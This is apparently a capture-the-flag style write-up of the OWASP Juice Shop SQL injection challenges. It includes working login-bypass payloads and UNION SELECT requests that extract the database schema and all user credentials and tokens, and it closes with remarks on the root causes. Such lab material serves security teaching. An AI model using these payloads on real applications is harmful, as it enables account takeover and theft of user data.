# SQL Injection Lab

## Admin Login

The goal of this challenge is to authenticate as the administrator of the **OWASP Juice Shop** application.
The administrator’s email address is `admin@juice-sh.op`, which can be identified from product reviews displayed within the application.

---

### Injection Point

A suitable injection point is the **login page**.
To verify whether it is vulnerable, a single quote character was inserted into both the email and password fields, and the server’s response was observed. The application returned the following error message:

```
SQLITE_ERROR: unrecognized token: \"3590cb8af0bbb9e78c343b52b93773c9\"
```

Along with the error, the backend exposed the SQL query being executed:

```sql
SELECT * FROM Users WHERE email = ''' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL
```

This confirms that user input is directly concatenated into the SQL statement without proper sanitization.

---

### Exploitation

Since the query is fully visible and vulnerable, it is possible to bypass authentication by injecting a comment into the email field while providing any arbitrary password. The following payload was used:

```
admin@juice-sh.op' --
```

This successfully logs in as the administrator.

---

### What Happens Internally

The input provided through the login form is not sanitized or parameterized and is directly embedded into the SQL query. As a result, the backend constructs the following statement:

```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL
```

The comment operator (`--`) causes the remainder of the query, including the password check, to be ignored. Consequently, authentication is granted solely based on the email address.

---

### Alternative Exploitation

An alternative way to bypass authentication is by using a tautology-based payload such as:

```
' OR '1'='1'--
```

This condition always evaluates to true, causing the application to authenticate the first user returned by the query, which in this case is the administrator account.

---

## SQL Schema Exfiltration

### Injection Point

To complete the schema exfiltration challenge, a new injection point was required.
Although the login page is vulnerable, it does not return query results upon successful authentication and therefore cannot be used for data extraction.

After logging in, the client issues a `GET` request to:

```
/rest/products/search?q=
```

This request retrieves all products from the database. Subsequent searches are handled client-side, but the initial request provides a suitable server-side injection point.

---

### Testing for Vulnerability

A test request was issued:

```http
GET /rest/products/search?q=banana HTTP/1.1
```

which correctly returned only the *Banana Juice* product.  
To test for SQL injection, a quote was appended:

```http
GET /rest/products/search?q=banana' HTTP/1.1
```

The server responded with:

```http
HTTP/1.1 500 Internal Server Error
```

The response body exposed the underlying SQL query:

```sql
SELECT * FROM Products WHERE ((name LIKE '%banana'%' OR description LIKE '%banana'%') AND deletedAt IS NULL) ORDER BY name
```

This confirms that the endpoint is vulnerable to SQL injection.

---

### Schema Exfiltration

Having identified both the vulnerability and the query structure, the next step was to perform a `UNION SELECT` attack.
First, the number of columns in the original query was determined using an `ORDER BY` clause:

```http
GET /rest/products/search?q=banana')) ORDER BY 100-- HTTP/1.1
```

This produced the following error:

```
SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 9
```

This indicates that the original query returns **9 columns**, which must be matched in the `UNION SELECT`.  
Using the known structure of the `sqlite_schema` table, the following payload was crafted to extract the database schema:

```http
GET /rest/products/search?q=banana'))+UNION+SELECT+type,name,tbl_name,rootpage,sql,NULL,NULL,NULL,NULL+FROM+sqlite_schema-- HTTP/1.1
```

This successfully exfiltrated the database schema.

---

## User Data Exfiltration

After completing the *Database Schema* challenge, the structure of the `Users` table was known. It contains the following columns:
* id
* username
* email
* password
* role
* deluxeToken
* lastLoginIp
* profileImage

Using this information, the following payload was used to extract user data:

```http
GET /rest/products/search?q=banana'))+UNION+SELECT+username,email,password,role,id,deluxeToken,lastLoginIp,profileImage,NULL+FROM+Users-- HTTP/1.1
```

This query successfully returned sensitive information for all registered users.

---

## Comments

The application is vulnerable because user-controlled input is directly embedded into SQL queries without sanitization or validation. The backend does **not use prepared statements**, allowing attackers to manipulate query structure.  
An additional critical issue is that **full SQL queries are disclosed in error messages**, providing attackers with valuable insight into the database schema and query logic.  
These weaknesses apply consistently across all the SQL injection challenges discussed.
